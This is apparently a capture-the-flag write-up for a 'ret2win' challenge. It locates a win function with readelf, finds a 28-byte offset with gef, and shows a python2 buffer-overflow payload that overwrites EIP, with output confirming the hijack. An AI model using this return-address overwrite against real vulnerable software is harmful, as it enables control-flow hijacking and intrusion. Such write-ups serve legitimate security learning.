### SOLVE

// Locate win-function & control EIP.
```as
└─$ readelf -s ret2win | grep hacked
    57: 08049182    43 FUNC    GLOBAL DEFAULT   13 hacked

Convert to little-endian:
'\x82\x91\x04\x08'

gdb -q ./ret2win
pattern create
gef➤  pattern offset $eip
[+] Searching for '68616161'/'61616168' with period=4
[+] Found at offset 28 (little-endian search) likely
```
// Create payload
```shell
// [padding + return-address]
python2 -c "print('A' * 28 + '\x82\x91\x04\x08')" > payload
``` 
// Run payload
```shell
└─$ ./ret2win < payload
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA��
>>>> ##This function is TOP SECRET! How did you get in here?! :O##
zsh: segmentation fault  ./ret2win < payload
```
// Other way to run payload
```shell
└─$ python2 -c "print('A' * 28 + '\x82\x91\x04\x08')" | ./ret2win
Name:
Hi there, AAAAAAAAAAAAAAAAAAAAAAAAAAAA��
>>>> ## This function is TOP SECRET! How did you get in here?! :O ## 
zsh: done                python2 -c "print('A' * 28 + '\x82\x91\x04\x08')" | 
zsh: segmentation fault  ./ret2win
```